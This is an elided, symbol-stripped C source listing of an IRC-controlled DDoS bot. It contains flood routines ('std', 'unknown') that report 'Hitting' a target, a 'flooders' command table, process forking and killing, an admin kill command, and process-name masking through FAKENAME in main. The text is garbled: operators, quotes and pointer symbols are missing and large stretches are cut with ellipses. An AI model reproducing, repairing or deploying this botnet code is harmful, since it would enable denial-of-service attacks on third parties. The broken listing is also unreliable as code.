...
unsigned int host2ip(char sender,char hostname) {
        ...
        if((i.s_addr = inet_addr(hostname)) == -1) {
                if((h = gethostbyname(hostname)) == NULL) {
                        Send(sock, NOTICE %s Unable to resolve %sn, sender,hostname);
                        exit(0);
                }
...
int mfork(char sender) {
	...
	if (disabled == 1) {
		Send(sock,NOTICE %s Unable to comply.n,sender);
		return 1;
	}
	parent=fork();
	...
	for (i=0;inumpids-1;i++) newpids[i]=pids[i];
	newpids[numpids-1]=parent;
	free(pids);
	pids=newpids;
	return parent;
}
void filter(char a) { while(a[strlen(a)-1] == 'r'  a[strlen(a)-1] == 'n') a[strlen(a)-1]=0; }
char makestring() {
	char tmp;
	int len=(rand()%5)+4,i;
 	FILE file;
	tmp=(char)malloc(len+1);
 	memset(tmp,0,len+1);
	char pre;
 	if ((file=fopen(usrdictwords,r)) == NULL) for (i=0;ilen;i++) tmp[i]=(rand()%(91-65))+65;
	else {
		int a=((rand()rand())%45402)+1;
		char buf[1024];
		for (i=0;ia;i++) fgets(buf,1024,file);
		memset(buf,0,1024);
		fgets(buf,1024,file);
		filter(buf);
		memcpy(tmp,buf,len);
...
void identd() {
        ...
        if (i = 0  i = 20) exit(0);
        szBuffer[i]=0;
        if (szBuffer[i-1] == 'n'  szBuffer[i-1] == 'r') szBuffer[i-1]=0;
        if (szBuffer[i-2] == 'n'  szBuffer[i-2] == 'r') szBuffer[i-2]=0;
	Send(tmpsock,%s  USERID  UNIX  %sn,szBuffer,ident);
        close(tmpsock);
        close(sockfd);
        exit(0);
}
...
void std(int sock, char sender, int argc, char argv) {
    if (argc  3) {
        ...
        Send(sock,PRIVMSG %s bot +std target port secsn,chan);
        exit(1);
    ...
    Send(sock,PRIVMSG %s [STD]Hitting %s!n,chan,argv[1]);
    ...
    while(1){
        if (a = 50) 
        {
            ...
            {
                Send(sock, PRIVMSG %s [STD]Done hitting %s!n, chan, argv[1]);
                close(iSTD_Sock);
                exit(0);
            }
            a = 0;
...
void stop(int sock, char sender, int argc, char argv){
    ...
    for (i=0;inumpids;i++) {
        if (pids[i] != 0 && pids[i] != getpid()) {
            if (sender) Send(sock,PRIVMSG %s Killing pid %d.n,chan,pids[i]);
                kill(pids[i],9);
        }
    }
}
...
void unknown(int sock, char sender, int argc, char argv) {
    ...
    if (argc != 2) {
        Send(sock,PRIVMSG %s bot +unknown target secsn,chan);
        exit(1);
    }
    ...
    Send(sock,PRIVMSG %s [UNK]Hitting %s!n,chan,argv[1]);
    ...
    Send(sock,PRIVMSG %s [UNK]Done hitting %s!n,chan,argv[1]);
    close(fd);
    exit(0);
}
...
void killsec(int sock, char sender, int argc, char argv) {
	...
	if(strcasecmp(adminuser1,sender) == 0){
		...
		Send(sock,PRIVMSG %s Nice try...n, chan);
...
void _PRIVMSG(int sock, char sender, char str) {
        ...
        for (i=0;istrlen(str) && str[i] != ' ';i++);
        str[i]=0;
        to=str;
        message=str+i+2;
        for (i=0;istrlen(sender) && sender[i] != '!';i++);
        sender[i]=0;
        if (message == '' && !strcasecmp(to,chan)) {
                char params[12], name[1024]={0};
                int num_params=0, m;
                message++;
                for (i=0;istrlen(message) && message[i] != ' ';i++);
                message[i]=0;
                ...
                for (i=0;istrlen(message);i++) if (message[i] == ' ') num_params++;
                num_params++;
                ...
                for (m=0; flooders[m].cmd != (char )0; m++) {
                        if (!strcasecmp(flooders[m].cmd,name)) {
                                ...
                                for (i=1;inum_params;i++) free(params[i]);
                                return;
                        }
                }
        }
...
void _376(int sock, char sender, char str) {
		Send(sock,MODE %s +pixBn,nick);
        Send(sock,JOIN %s %sn,chan,key);
		Send(sock,WHO %sn,nick);
}
void _PING(int sock, char sender, char str) {

Send(sock,PONG %sn,str);
...
void _352(int sock, char sender, char str) {
        ...
        unsigned long m;
        for (i=0,d=0;d5;d++) {
                for (;istrlen(str) && msg != ' ';msg++,i++); msg++;
                if (i == strlen(str)) return;
        }
        for (i=0;istrlen(msg) && msg[i] != ' ';i++);
        msg[i]=0;
        if (!strcasecmp(msg,nick) && !spoofsm) {
                ...
                if ((m = inet_addr(msg)) == -1) {
                        if ((hostm=gethostbyname(msg)) == NULL) {
                                Send(sock,NOTICE %s I'm having a problem resolving my host, someone will have to SPOOFS me manually.n,chan);
                                return;
                        }
...
int main(int argc, char argv[]) {
	...
	if (file == NULL) {
        ...
        if (file != NULL) {
                ...
                if (strcmp(cwd,)) {
                        while(argv[0][i] != '') i--;
                        sprintf(outfile,%s%sn,cwd,argv[0]+i);
                        while(!feof(file)) {
                                fgets(buf,1024,file);
	...
	strncpy(argv[0],FAKENAME,strlen(argv[0]));
        for (on=1;onargc;on++) memset(argv[on],0,strlen(argv[on]));
#endif
...
sa
	...
	con();
		Send(sock,PASS %sn, pass);
        Send(sock,NICK %snUSER %s localhost localhost %sn,nick,ident,user);
        while(1) {
                unsigned long i;
                fd_set n;
                struct timeval tv;
                ...
                for (i=0;inumpids;i++) if (waitpid(pids[i],NULL,WNOHANG)  0) {
                        unsigned int newpids,on;
                        for (on=i+1;onnumpids;on++) pids[on-1]=pids[on];
			pids[on-1]=0;
                        numpids--;
                        newpids=(unsigned int)malloc((numpids+1)sizeof(unsigned int));
                        for (on=0;onnumpids;on++) newpids[on]=pids[on];
                        free(pids);
                        pids=newpids;
                }
                if (FD_ISSET(sock,&n)) {
